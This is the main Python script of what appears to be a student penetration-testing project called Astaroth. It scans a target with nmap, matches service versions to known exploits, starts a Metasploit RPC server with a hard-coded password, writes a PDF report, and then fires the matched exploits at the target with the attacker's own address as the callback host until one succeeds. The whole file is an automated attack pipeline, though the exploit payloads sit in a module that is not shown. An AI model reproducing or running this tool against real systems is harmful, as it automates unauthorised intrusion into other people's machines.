# Projet SDV - 2024 Cybersécurité
# Author DMO, LIT & MNE
# A python program that use the python-nmap library to scan a host and store the open ports and their versions in an array
# Each port is an array for which the first element is the service name and the second element is the version
# Example : if the port is vsftpd 3.0.3, the array will be ['vsftpd', '3.0.3']
# The user call the function scan_host() and pass the host ip address as a parameter

import nmap
import sys
import pdf_reports
from pdf_reports import ReportWriter
import subprocess
import pandas as pd
import tqdm
import termcolor
from exploit_deck import *
import time

def show_motd():
    motd = """
    
 ▄▄▄        ██████ ▄▄▄█████▓ ▄▄▄       ██▀███   ▒█████  ▄▄▄█████▓ ██░ ██ 
▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██░ ██▒
▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██▀▀██░
░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ░▓█ ░██ 
 ▓█   ▓██▒▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░▓█▒░██▓
 ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░    ▒ ░░▒░▒
  ▒   ▒▒ ░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░▒ ░ ▒░  ░ ▒ ▒░     ░     ▒ ░▒░ ░
  ░   ▒   ░  ░  ░    ░        ░   ▒     ░░   ░ ░ ░ ░ ▒    ░       ░  ░░ ░
      ░  ░      ░                 ░  ░   ░         ░ ░            ░  ░  ░

      

    """
    print(termcolor.colored(motd, 'red'))

def scan_host(host):
    nm = nmap.PortScanner()
    nm.scan(host, arguments='-sV -p1-10000 --version-light')
    open_ports = []
    with tqdm.tqdm(total=1, desc="⛥> Scan des ports...") as pbar:
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for port in lport:
                    product = nm[host][proto][port]['product']
                    version = nm[host][proto][port]['version']
                    open_ports.append([product, version])
            time.sleep(0.1)
            pbar.update(1)

    open_ports = [list(t) for t in set(tuple(element) for element in open_ports)]
    return open_ports

# ptet tout suppr pour utiliser metasploit on sait pas
def search_sploit(open_ports):
    possible_exploits = []
    with tqdm.tqdm(total=len(open_ports), desc="⛥> Recherche d'exploit") as pbar:
        for port in open_ports:
            product = port[0]
            version = port[1]
            if version == None:
                version = ''
            result = compare_exploit(product, version)
            if(result != "No exploit found"):
                possible_exploits.append([product, version, result])
            pbar.update(1)
            time.sleep(0.1)
    return possible_exploits

def sploit_to_pdf(list_of_sploit):
    # On créer un dataframe pandas avec les données pour faire un tableau
    # On utilise list_of_sploit pour remplir le tableau
    df = pd.DataFrame(list_of_sploit, columns=["Service", "Version", "Exploit"])
    path = str(subprocess.check_output("pwd")).replace("b'", "").replace("\\n'", "")
    report_writer = ReportWriter(
    title="Report d'exploitation de la machine " + host,
    )
    # si on le path contient le nom du dossier, on sait qu'on est dans le bon dossier
    if "astaroth" not in path:
        path += "/astaroth"
    pdf_reports.GLOBALS["logo_path"] = path +"/final_logo.png"
    html = report_writer.pug_to_html(path + "/template.pug", dataframe=df)
    report_writer.write_report(html, "report_exploitation.pdf")    

def sploiting(list_of_sploit, host,lhost):
    for sploit in list_of_sploit:
        product = sploit[0]
        exploit = sploit[2]
        #print(f'Trying to exploit {product} with {exploit}...')
        endcode = use_exploit(exploit,host,lhost)
        if endcode == 0:
            #print('Exploit succeeded!')
            break

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python3 main.py <host>')
        sys.exit(1)
    global host
    host = sys.argv[1]
    lhost = str(subprocess.check_output("ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'", shell=True)).replace("b'", "").replace("\\n'", "")    
    # faudrait faire un check la mais flemme

    

    # ICI on PIMP le programme
    show_motd()
    print("⛥> Lancement du serveur metasploit...")
    command = ["msfrpcd", "-P", "astaroth"]
    subprocess.check_call(command,stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("⛥> Serveur metasploit OK")
    time.sleep(2)
    print("⛥> La machine cible est " + termcolor.colored(host, 'red'))
    open_ports = scan_host(host)
    list_of_sploit = search_sploit(open_ports)
    sploit_to_pdf(list_of_sploit)
    # Quand le reporting est fait, on passe a l'exploitation
    # et a l'histoire
    sploiting(list_of_sploit, host,lhost)    
    print('bye bye!')
